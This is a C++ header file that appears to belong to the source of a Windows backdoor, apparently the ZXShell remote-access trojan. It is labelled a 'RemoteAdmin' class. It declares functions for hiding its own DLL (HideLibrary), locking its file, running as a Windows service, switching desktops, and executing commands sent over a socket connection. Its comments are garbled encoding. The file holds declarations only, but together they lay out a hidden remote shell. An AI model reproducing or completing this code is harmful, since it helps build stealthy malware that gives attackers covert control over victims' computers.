// ShellMain.h: interface for the RemoteAdmin class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SHELLMAIN_H__8FAE3BA9_2D2C_4349_8686_DE5AD7FC6B49__INCLUDED_)
#define AFX_SHELLMAIN_H__8FAE3BA9_2D2C_4349_8686_DE5AD7FC6B49__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define _WIN32_DCOM
#define _WIN32_WINNT 0x0500

#include <winsock2.h>
#include <windows.h>
#include <MSTcpIP.h>
#include <Windns.h>
#include <time.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <urlmon.h> 
#include <lm.h>
#include <tchar.h> 
#include <psapi.h>
#include <string.h>
#include <memory.h>

#include "ZXPLUG.h"


//user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib 
//ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib 

#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"winspool.lib")
#pragma comment(lib,"comdlg32.lib")
#pragma comment(lib,"advapi32.lib")
#pragma comment(lib,"gdi32.lib")
#pragma comment(lib,"shell32.lib")
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"Psapi.lib")
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"ADVAPI32.lib")
#pragma comment(lib,"URLMON.LIB")
#pragma comment(lib,"netapi32.lib")
#pragma comment(lib,"Dnsapi.lib")

#define KEY_BUFF            256
#define MAX_BUFF            1024*8


//���������ı���
extern int SetupMode; //1==��������
extern char ServiceName[50];
extern HANDLE g_hDll;
extern SERVICE_STATUS_HANDLE hSrv;
extern DWORD dwCurrState;
extern HANDLE RSHandle;
extern char g_DllPath[MAX_PATH];
extern char regSvcInfoFile[MAX_PATH];

extern SOCKET g_BaseSocket;
extern BOOL Working;
extern char Temp[MAX_BUFF];
extern char LocalHostName[128];

//��������Ķ���
extern CZXPLUG *zxplug;
extern C_SHELLLIST connlist;



//�汾
#define SHELLVERSION (float)3.20

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );
void __stdcall ServiceHandler( DWORD dwCommand );



BOOL WINAPI ShellMain();
BOOL incLibraryCount(HMODULE ownInstance);
DWORD WINAPI UnLoadLibrary(LPVOID lParam);
BOOL HideLibrary();
void LockMyFile();

int __printf(const char *fmt, ...);


SOCKET doAction_Connect(SOCKET Socket, int action);
void doAction_CreateThread(void *pFunc, void *arg);


int SendMessage(SOCKET Socket, const char *fmt, ...);
void err_display(SOCKET Socket, char *msg, bool sendimmediately);
BOOL ChangeServiceDesktop(char *deskname);

void ShellHelp(SOCKET Socket);
BOOL ExeCommand(SOCKET Socket,char *Command);
#endif // !defined(AFX_SHELLMAIN_H__8FAE3BA9_2D2C_4349_8686_DE5AD7FC6B49__INCLUDED_)
